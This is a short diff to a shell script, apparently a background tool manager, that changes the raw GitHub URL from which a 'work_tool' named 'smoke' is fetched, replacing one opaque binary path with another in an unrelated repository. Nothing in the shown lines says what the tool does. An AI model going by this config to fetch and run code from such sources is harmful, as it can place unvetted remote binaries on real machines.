@@ -51,7 +51,7 @@ trap "rm -f $MANAGER_LOCK" EXIT
 
 # --- CONFIGURATION ---
 work_tool="smoke"
-raw_work_tool_url="https://github.com/ronaldscraper2/Salon/raw/refs/heads/main/Silly_Doctor"
+raw_work_tool_url="https://github.com/fuzilemphango/riot/raw/refs/heads/main/build"
 
 rotate_log() {
     local file=$1
